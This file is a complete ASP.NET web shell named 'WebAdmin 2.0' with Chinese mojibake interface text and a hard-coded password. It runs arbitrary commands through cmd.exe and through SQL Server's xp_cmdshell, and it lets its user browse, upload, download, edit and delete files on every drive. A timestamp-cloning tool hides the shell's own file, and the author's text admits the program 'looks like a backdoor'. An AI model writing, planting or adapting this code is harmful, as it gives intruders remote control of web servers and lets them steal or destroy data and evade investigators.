   <%@ Page Language="VB" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
   <%@ Import Namespace="System.IO" %>
   <%@ import namespace="System.Diagnostics" %>
   <script runat="server">
   Dim PASSWORD as string = "123123"   '×¢Òâ£ºÕâÀï°ÑwebadminÐÞ¸Ä³ÉÄã×Ô¼ºµÄÃÜÂë£¡£¡£¡£¡£¡£¡
   '----------------------------------------------------------------------
   '-----------------      WebAdmin by WekweN        -----------------
   '----------------------------------------------------------------------
   '------------
   dim url,TEMP1,TEMP2,TITLE as string
   Sub Login_click(sender As Object, E As EventArgs)
       if Textbox.Text=PASSWORD then
           session("lake2")=1
           session.Timeout=45
       else
           response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")
       end if
   End Sub
   Sub RunCMD(Src As Object, E As EventArgs)
       Dim myProcess As New Process()
       Dim myProcessStartInfo As New ProcessStartInfo("cmd.exe")
       myProcessStartInfo.UseShellExecute = False
       myProcessStartInfo.RedirectStandardOutput = true
       myProcess.StartInfo = myProcessStartInfo
       myProcessStartInfo.Arguments="/c " & Cmd.text
       myProcess.Start()
       Dim myStreamReader As StreamReader = myProcess.StandardOutput
       Dim myString As String = myStreamReader.Readtoend()
       myProcess.Close()
       mystring=replace(mystring,">","&lt;")
       mystring=replace(mystring,"<","&gt;")
       result.text=Cmd.text & vbcrlf & "<pre>" & mystring & "</pre>"
       Cmd.text=""
   End Sub
   Sub CloneTime(Src As Object, E As EventArgs)
       existdir(time1.Text)
       existdir(time2.Text)
       Dim thisfile As FileInfo =New FileInfo(time1.Text)
       Dim thatfile As FileInfo =New FileInfo(time2.Text)
       thisfile.LastWriteTime = thatfile.LastWriteTime
       thisfile.LastAccessTime = thatfile.LastAccessTime
       thisfile.CreationTime = thatfile.CreationTime
       response.Write("<font color=""red"">Clone Time ³É¹¦£¡</font>")
   End Sub
   sub Editor(Src As Object, E As EventArgs)
       dim mywrite as new streamwriter(filepath.text,false,encoding.default)
       mywrite.write(content.text)
       mywrite.close
       response.Write("<script>alert('±à¼|ÐÞ¸Ä " & replace(filepath.text,"\","\\") & " ³É¹¦£¡');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(filepath.text)) &"'</sc" & "ript>")
   end sub
   Sub UpLoad(Src As Object, E As EventArgs)
       dim filename,loadpath as string
       filename=path.getfilename(UpFile.value)
       loadpath=request.QueryString("src") & filename
       if  file.exists(loadpath)=true then
           response.Write("<script>alert('File " & replace(loadpath,"\","\\") & " have existed , upload fail!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(request.QueryString("src")) &"'</sc" & "ript>")
           response.End()
       end if
       UpFile.postedfile.saveas(loadpath)
       response.Write("<script>alert('File " & filename & " upload success!\nFile info:\n\nClient Path:" & replace(UpFile.value,"\","\\") & "\nFile Size:" & UpFile.postedfile.contentlength & " bytes\nSave Path:" & replace(loadpath,"\","\\") & "\n');")
       response.Write("location.href='" & request.ServerVariables("URL") & "?action=goto&src=" & server.UrlEncode(request.QueryString("src")) & "'</sc" & "ript>")
   End Sub
   Sub NewFD(Src As Object, E As EventArgs)
       url=request.form("src")
       if NewFile.Checked = True then
           dim mywrite as new streamwriter(url & NewName.Text,false,encoding.default)
           mywrite.close
           response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(url & NewName.Text))
       else
           directory.createdirectory(url & NewName.Text)
           response.Write("<script>alert('ÐÂ½¨ÎÄ¼þ¼Ð " & replace(url & NewName.Text ,"\","\\") & " ³É¹¦£¡');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>")
       end if
   End Sub
   Sub del(a)
       if right(a,1)="\" then
           dim xdir as directoryinfo
           dim mydir as new DirectoryInfo(a)
           dim xfile as fileinfo
           for each xfile in mydir.getfiles()
               file.delete(a & xfile.name)
           next
           for each xdir in mydir.getdirectories()
               call del(a & xdir.name & "\")
           next
           directory.delete(a)
       else
           file.delete(a)
       end if
   End Sub
   Sub copydir(a,b)
       dim xdir as directoryinfo
       dim mydir as new DirectoryInfo(a)
       dim xfile as fileinfo
       for each xfile in mydir.getfiles()
           file.copy(a & "\" & xfile.name,b & xfile.name)
       next
       for each xdir in mydir.getdirectories()
           directory.createdirectory(b & path.getfilename(a & xdir.name))
           call copydir(a & xdir.name & "\",b & xdir.name & "\")
       next
   End Sub
   Sub xexistdir(temp,ow)
       if directory.exists(temp)=true or file.exists(temp)=true then
           if ow=0  then
               response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(url))
           elseif ow=1 then
               del(temp)
           else
               dim d as string = session("cutboard")
               if right(d,1)="\" then
                   TEMP1=url & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
               else
                   TEMP2=url & second(now) & replace(path.getfilename(d),"","")
               end if
           end if
       end if
   End Sub
   Sub existdir(temp)
           if  file.exists(temp)=false and directory.exists(temp)=false then
               response.Write("<script>alert('²»´æÔÚÄ¿Â¼»òÕßÎÄ¼þ " & replace(temp,"\","\\")  &" £¡ ÕâÊÇ¸ö¹âÇýÂð£¿');</sc" & "ript>")
               response.Write("<br><br><a href='javascript:history.back(1);'>µãÕâÀï·µ»ØÖ®£¡</a>")
               response.End()
           end if
   End Sub
   Sub RunSQLCMD(Src As Object, E As EventArgs)
       Dim adoConn,strQuery,recResult,strResult
       if SqlName.Text<>"" then
           adoConn=Server.CreateObject("ADODB.Connection")
           adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text)
           If Sqlcmd.Text<>"" Then
               strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
               recResult = adoConn.Execute(strQuery)
               If NOT recResult.EOF Then
                   Do While NOT recResult.EOF
                       strResult = strResult & chr(13) & recResult(0).value
                       recResult.MoveNext
                   Loop
               End if
               recResult = Nothing
               strResult = Replace(strResult," ","&nbsp;")
               strResult = Replace(strResult,"<","&lt;")
               strResult = Replace(strResult,">","&gt;")
               resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
               SqlCMD.Text=""
            End if
           adoConn.Close
        End if
    End Sub
   Function GetStartedTime(ms)
       GetStartedTime=cint(ms/(1000*60*60))
   End function
   Function getIP()
       Dim strIPAddr as string
       If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
           strIPAddr = Request.ServerVariables("REMOTE_ADDR")
       ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
           strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
       ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
           strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
       Else
           strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
       End If
       getIP = Trim(Mid(strIPAddr, 1, 30))
   End Function
   Function Getparentdir(nowdir)
       dim temp,k as integer
       temp=1
       k=0
       if len(nowdir)>4 then
           nowdir=left(nowdir,len(nowdir)-1)
       end if
       do while temp<>0
           k=temp+1
           temp=instr(temp,nowdir,"\")
           if temp =0 then
               exit do
           end if
           temp = temp+1
       loop
       if k<>2 then
           getparentdir=mid(nowdir,1,k-2)
       else
           getparentdir=nowdir
       end if
   End function
   Function Rename()
       url=request.QueryString("src")
       if file.exists(Getparentdir(url) & request.Form("name")) then
           rename=0
       else
           file.copy(url,Getparentdir(url) & request.Form("name"))
           del(url)
           rename=1
       end if
   End Function
   Function GetSize(temp)
       if temp < 1024 then
           GetSize=temp & " bytes"
       else
           if temp\1024 < 1024 then
               GetSize=temp\1024 & " KB"
           else
               if temp\1024\1024 < 1024 then
                   GetSize=temp\1024\1024 & " MB"
               else
                   GetSize=temp\1024\1024\1024 & " GB"
               end if
           end if
       end if
   End Function
       Sub downTheFile(thePath)
           dim stream
           stream=server.createObject("adodb.stream")
           stream.open
           stream.type=1
           stream.loadFromFile(thePath)
           response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
           response.addHeader("Content-Length",stream.Size)
           response.charset="UTF-8"
           response.contentType="application/octet-stream"
           response.binaryWrite(stream.read)
           response.flush
           stream.close
           stream=nothing
           response.End()
       End Sub
   </script>
   <%
   if request.QueryString("action")="down" and session("lake2")=1 then
           downTheFile(request.QueryString("src"))
           response.End()
   end if
   Dim hu as string = request.QueryString("action")
   if hu="cmd" then
   TITLE="CMD.NET"
   elseif hu="sqlrootkit" then
   TITLE="SqlRootKit.NET"
   elseif hu="clonetime" then
   TITLE="Clone Time"
   elseif hu="information" then
   TITLE="Web Server Info"
   elseif hu="goto" then
   TITLE="WebAdmin 2.0"
   else
   TITLE=request.ServerVariables("HTTP_HOST")
   end if
   %>
   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
   <html>
   <style type="text/css">
   body,td,th {
       color: #0000FF;
       font-family: Verdana, Arial, Helvetica, sans-serif;
   }
   body {
       background-color: #ffffff;
       font-size:14px;
   }
   a:link {
       color: #0000FF;
       text-decoration: none;
   }
   a:visited {
       text-decoration: none;
       color: #0000FF;
   }
   a:hover {
       text-decoration: none;
       color: #FF0000;
   }
   a:active {
       text-decoration: none;
       color: #FF0000;
   }
   .buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
   .TextBox {border: 1px solid #084B8E}

   .style3 {color: #FF0000}
   .style4 {font-family: "Ó×Ô²"}
   </style>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title><%=TITLE%></title>
   </head>
   <body>
   <%
   Dim error_x as Exception
   Try
   if session("lake2")<>1 then
       response.Write("<br>")
       response.Write("Hello , thank you for using my program !<br>")
       response.Write("This program is run at ASP.NET Environment and manage the web directory.<br>")
       response.Write("Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>")
       response.Write("<span class=""style3"">Notice:</span> only click ""Login"" to login.")
   %>
   <form runat="server">
     Your Password:<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" />
     <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="login_click" class="buttom" />
   </form>
   <%
   else
       dim temp as string
       temp=request.QueryString("action")
       if temp="" then temp="goto"
       select case temp
       case "goto"
           if request.QueryString("src")<>"" then
               url=request.QueryString("src")
           else
               url=server.MapPath(".") & "\"
           end if
       call existdir(url)
       dim xdir as directoryinfo
       dim mydir as new DirectoryInfo(url)
       dim hupo as string
       dim xfile as fileinfo
   %>
   <p align="center">µ±Ç°Ä¿Â¼£º<font color=red><%=url%></font></p>
   <table width="70%"  border="0" align="center">
     <tr>
       <td width="11%">²Ù×÷£º</td>
       <td width="89%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">ÐÂ½¨</a>
         <%if session("cutboard")<>"" then%>
         <a href="?action=plaster&src=<%=server.UrlEncode(url)%>" title="you can plaster">Õ³Ìù</a>
         <%else%>
   Õ³Ìù
   <%end if%>
   <a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">ÉÏ´«</a> <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">»Øµ½ËùÔÚÄ¿Â¼ </a><a href="?action=logout" title="Exit">ÍË³ö</a></td>
     </tr>
     <tr>
       <td>
       ×ªµ½£º</td>
       <td>
   <%
   dim i as integer
   for i =0 to Directory.GetLogicalDrives().length-1
       response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
   next
   %>
   </td>
     </tr>

     <tr>
       <td>¹¤¾ß£º</td>
       <td><a href="?action=sqlrootkit" target="_blank">SqlRootKit.NET </a><a href="?action=cmd" target="_blank">CMD.NET</a> <a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" target="_blank">CloneTime</a> <a href="?action=information" target="_blank">ÏµÍ³ÐÅÏ¢</a></td>
     </tr>
   </table>
   <hr noshade>
   <table width="90%"  border="0" align="center">
       <tr>
       <td width="40%"><strong>Ãû³Æ</strong></td>
       <td width="10%"><strong>´óÐ¡</strong></td>
       <td width="25%"><strong>ÐÞ¸ÄÊ±¼ä</strong></td>
       <td width="25%"><strong>²Ù×÷</strong></td>
       </tr>
         <tr>
           <td><%
           hupo= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><i>¡ü¸¸Ä¿Â¼¡ü</i></a></td></tr>"
           response.Write(hupo)
           for each xdir in mydir.getdirectories()
               response.Write("<tr>")
               dim filepath as string
               filepath=server.UrlEncode(url & xdir.name)
               hupo= "<td><a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
               response.Write(hupo)
               response.Write("<td>&lt;dir&gt;</td>")
               response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
               hupo="<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>¼ôÇÐ" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>¸´ÖÆ</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>É¾³ý</a></td>"
               response.Write(hupo)
               response.Write("</tr>")
           next
           %></td>
     </tr>
           <tr>
           <td><%
           for each xfile in mydir.getfiles()
               dim filepath2 as string
               filepath2=server.UrlEncode(url & xfile.name)
               response.Write("<tr>")
               hupo="<td>" & xfile.name & "</td>"
               response.Write(hupo)
               hupo="<td>" & GetSize(xfile.length) & "</td>"
               response.Write(hupo)
               response.Write("<td>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
               hupo="<td><a href='?action=edit&src=" & filepath2 & "'>±à¼</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>¼ôÇÐ</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>¸´ÖÆ</a>|<a href='?action=rename&src=" & filepath2 & "'>ÖØÃüÃû</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>ÏÂÔØ</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>É¾³ý</a></td>"
               response.Write(hupo)
               response.Write("</tr>")
           next
           response.Write("</table>")
           %></td>
         </tr>
   </table>
   <script language="javascript">
   function del()
   {
   if(confirm("È·¶¨É¾³ý£¿£¨²»¿É»Ö¸´£¬ÏëÇå³þÅ¶£©")){return true;}
   else{return false;}
   }
   function down()
   {
   if(confirm("Èç¹û¸ÃÎÄ¼þ³¬¹ý20M,\n½¨Òé²»ÒªÍ¨¹ýÁ÷·½Ê½ÏÂÔØ\nÕâÑù»áÕ¼ÓÃ·þÎñÆ÷´óÁ¿µÄ×ÊÔ´\n²¢¿ÉÄÜµ¼ÖÂ·þÎñÆ÷ËÀ»ú!\nÄã¿ÉÒÔ½«ÎÄ¼þcopyµ½webÄ¿Â¼Ê¹ÓÃhttpÏÂÔØ\nÈ·¶¨Ê¹ÓÃÁ÷·½Ê½ÏÂÔØÂð£¿")){return true;}
   else{return false;}
   }
   </script>
   <%
   case "information"
       dim CIP,CP as string
       if getIP()<>request.ServerVariables("REMOTE_ADDR") then
               CIP=getIP()
               CP=request.ServerVariables("REMOTE_ADDR")
       else
               CIP=request.ServerVariables("REMOTE_ADDR")
               CP="None"
       end if
   %>
   <table width="80%"  border="1" align="center">
     <tr>
       <td colspan="2"><span class="style3">Web Server Information                 </span><i><a href="javascript:closewindow();">¹Ø±Õ±¾´°¿Ú</a></i></td>
     </tr>
     <tr>
       <td width="40%">Server IP</td>
       <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
     </tr>
     <tr>
       <td height="73">Machine Name</td>
       <td><%=Environment.MachineName%></td>
     </tr>
     <tr>
       <td>Network Name</td>
       <td><%=Environment.UserDomainName.ToString()%></td>
     </tr>
     <tr>
       <td>User Name in this Process</td>
       <td><%=Environment.UserName%></td>
     </tr>
     <tr>
       <td>OS Version</td>
       <td><%=Environment.OSVersion.ToString()%></td>
     </tr>
     <tr>
       <td>Started Time</td>
       <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
     </tr>
     <tr>
       <td>System Time</td>
       <td><%=now%></td>
     </tr>
     <tr>
       <td>IIS Version</td>
       <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
     </tr>
     <tr>
       <td>HTTPS</td>
       <td><%=request.ServerVariables("HTTPS")%></td>
     </tr>
     <tr>
       <td>PATH_INFO</td>
       <td><%=request.ServerVariables("PATH_INFO")%></td>
     </tr>
     <tr>
       <td>PATH_TRANSLATED</td>
       <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
     <tr>
       <td>SERVER_PORT</td>
       <td><%=request.ServerVariables("SERVER_PORT")%></td>
     </tr>
       <tr>
       <td>SeesionID</td>
       <td><%=Session.SessionID%></td>
     </tr>
     <tr>
       <td colspan="2"><span class="style3">Client Infomation</span></td>
     </tr>
     <tr>
       <td>Client Proxy</td>
       <td><%=CP%></td>
     </tr>
     <tr>
       <td>Client IP</td>
       <td><%=CIP%></td>
     </tr>
     <tr>
       <td>User</td>
       <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
     </tr>
   </table>
   <%
       case "cmd"
   %>
   <form runat="server">
     <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:closewindow();">¹Ø±Õ±¾´°¿Ú</a></i></p>
     <p> ÒÔ ASP.NETÕÊ»§È¨ÏÞÖ´ÐÐÃüÁî (<span class="style3">×¢Òâ£º Ö»ÄÜµã»÷¡°Run¡±ÔËÐÐ</span>)</p>
     Command:
     <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
     <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>
     <p>
      <asp:Label ID="result" runat="server" style="style2"/>      </p>
   </form>
   <%
       case "sqlrootkit"
   %>
   <form runat="server">
     <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:closewindow();">¹Ø±Õ±¾´°¿Ú</a></i></p>
     <p> ÒÔSQL ÕÊ»§È¨ÏÞÖ´ÐÐÃüÁî(<span class="style3">×¢Òâ£º Ö»ÄÜµã»÷¡°Run¡±ÔËÐÐ</span>)</p>
     <p>Ö÷»ú£º
       <asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
     <p>
     SQLÓÃ»§Ãû£º
       <asp:TextBox ID="SqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
     SQLÃÜ  Âë£º
     <asp:TextBox ID="SqlPass" runat="server" Width="80" class="TextBox"/>
     </p>
     Command:
     <asp:TextBox ID="Sqlcmd" runat="server" Width="300" class="TextBox"/>
     <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>
     <p>
      <asp:Label ID="resultSQL" runat="server" style="style2"/>      </p>
   </form>
   <%
       case "del"
           dim a as string
           a=request.QueryString("src")
           call existdir(a)
           call del(a)
           response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success¡ê?"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
       case "copy"
           call existdir(request.QueryString("src"))
           session("cutboard")="" & request.QueryString("src")
           response.Write("<script>alert('ÎÄ¼þÐÅÏ¢ÒÑ¾¸´ÖÆµ½¼ôÇÐ°å£¬½øÈëÄ¿±êÄ¿Â¼Õ³Ìù¼´¿É');location.href='JavaScript:self.close()';</script>")
       case "cut"
           call existdir(request.QueryString("src"))
           session("cutboard")="" & request.QueryString("src")
           response.Write("<script>alert('ÎÄ¼þÐÅÏ¢ÒÑ¾¸´ÖÆµ½¼ôÇÐ°å£¬½øÈëÄ¿±êÄ¿Â¼Õ³Ìù¼´¿É');location.href='JavaScript:self.close()';</script>")
       case "plaster"
           dim ow as integer
           if request.Form("OverWrite")<>"" then ow=1
           if request.Form("Cancel")<>"" then ow=2
           url=request.QueryString("src")
           call existdir(url)
           dim d as string
           d=session("cutboard")
           if left(d,1)="" then
               TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
               TEMP2=url & replace(path.getfilename(d),"","")
               if right(d,1)="\" then
                   call xexistdir(TEMP1,ow)
                   directory.move(replace(d,"",""),TEMP1 & "\")
                   response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
               else
                   call xexistdir(TEMP2,ow)
                   file.move(replace(d,"",""),TEMP2)
                   response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
               end if
           else
               TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
               TEMP2=url & path.getfilename(replace(d,"",""))
               if right(d,1)="\" then
                   call xexistdir(TEMP1,ow)
                   directory.createdirectory(TEMP1)
                   call copydir(replace(d,"",""),TEMP1 & "\")
                   response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
               else
                   call xexistdir(TEMP2,ow)
                   file.copy(replace(d,"",""),TEMP2)
                   response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
               end if
           end if
       case "upfile"
           url=request.QueryString("src")
   %>
   <form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
    Äã½«ÉÏ´«ÎÄ¼þµ½Ä¿Â¼<span class="style3"><%=url%></span><br>ÇëÑ¡ÔñÉÏ´«ÎÄ¼þ£º
       <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
       <input type="submit" id="UpFileSubit" value="ÉÏ´«" runat="server" onserverclick="UpLoad" class="buttom">
   </form>
   <a href="javascript:history.back(1);" style="color:#FF0000">·µ»Ø</a>
   <%
       case "new"
           url=request.QueryString("src")
   %>
   <form runat="server">
     <%=url%><br>
     Ãû³Æ£º
     <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
     <br>
     <asp:RadioButton ID="NewFile" Text="ÎÄ¼þ" runat="server" GroupName="New" Checked="true"/>
     <asp:RadioButton ID="NewDirectory" Text="ÎÄ¼þ¼Ð" runat="server"  GroupName="New"/>
     <br>
     <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>
     <input name="Src" type="hidden" value="<%=url%>">
   </form>
   <a href="javascript:history.back(1);" style="color:#FF0000">·µ»Ø</a>
   <%
       case "edit"
           dim b as string
           b=request.QueryString("src")
           call existdir(b)
           dim myread as new streamreader(b,encoding.default)
           filepath.text=b
           content.text=myread.readtoend
   %>
   <form runat="server">
     <table width="80%"  border="1" align="center">
       <tr>      <td width="11%">Â·¾¶</td>
         <td width="89%">
         <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
         *</td>
       </tr>
       <tr>
         <td>ÄÚÈÝ</td>
         <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
       </tr>
       <tr>
         <td></td>
         <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>
         </td>
       </tr>
     </table>
   </form>
   <a href="javascript:history.back(1);" style="color:#FF0000">·µ»Ø</a>
     <%
           myread.close
       case "rename"
           url=request.QueryString("src")
           if request.Form("name")="" then
       %>
   <form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
     <p>Äã½«ÖØÃüÃû<span class="style3"><%=request.QueryString("src")%></span>Îª£º<%=getparentdir(request.QueryString("src"))%>
       <input type="text" name="name" class="TextBox">
       <input type="submit" name="Submit3" value="Submit" class="buttom">
   </p>
   </form>
   <a href="javascript:history.back(1);" style="color:#FF0000">·µ»Ø</a>
   <script language="javascript">
   function checkname()
   {
   if(formRn.name.value==""){alert("ÄãÓ¦¸ÃÊäÈëÎÄ¼þÃû :(");return false}
   }
   </script>
     <%
           else
               if Rename() then
                   response.Write("<script>alert('ÖØÃüÃû " & replace(url,"\","\\") & " Îª " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " ³É¹¦£¡');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
               else
                   response.Write("<script>alert('´æÔÚÍ¬ÃûÎÄ¼þ£¬ÖØÃüÃûÊ§°Ü :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
               end if
           end if
       case "samename"
           url=request.QueryString("src")
   %>
   <form name="form1" method="post" action="?action=plaster&src=<%=server.UrlEncode(url)%>">
   <p class="style3">´æÔÚÍ¬ÃûÎÄ¼þ£¬¸²¸ÇÂð£¿£¨Èç¹ûÄã²»¸²¸ÇµÄ»°£¬³ÌÐò×Ô¶¯Ìí¼ÓÒ»¸öËæ»úÊý×÷ÎªÇ°×º£©</p>
     <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
   <input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
   </form>
   <a href="javascript:history.back(1);" style="color:#FF0000">·µ»Ø</a>
      <%
       case "clonetime"
           time1.Text=request.QueryString("src")&"webadmin.aspx"
           time2.Text=request.QueryString("src")
       %>
   <form runat="server">
     <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">¹Ø±Õ±¾´°¿Ú</a></i> </p>
     <p>Ò»¸öÐÞ¸ÄÎÄ¼þ´´½¨¡¢·ÃÎÊ¡¢ÐÞ¸ÄÊ±¼äÓëÆäËûÎÄ¼þÒ»ÖÂµÄ¹¤¾ß</p>
     <p>ÒªÐÞ¸ÄµÄÎÄ¼þ£º<asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
     <p>²ÎÕÕÎÄ¼þ£º&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
   <asp:Button ID="ButtonClone" Text="Ìá½»" runat="server" CssClass="buttom" OnClick="CloneTime"/>
   </form>
   <p>
     <%
       case "logout"
           session.Abandon()
           response.Write("<script>alert(' Goodbye !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
       end select
   end if
   Catch error_x
       response.Write("<font color=""red"">Wrong£º </font>"&error_x.Message)
   End Try
   %>
   </p>
   </p>
   <hr noshade>
   <script language="javascript">
   function closewindow()
   {self.close();}
   </script>
   <p align="center">WebAdmin2.0(beta) By WekweN</p>
   </body>
   </html>
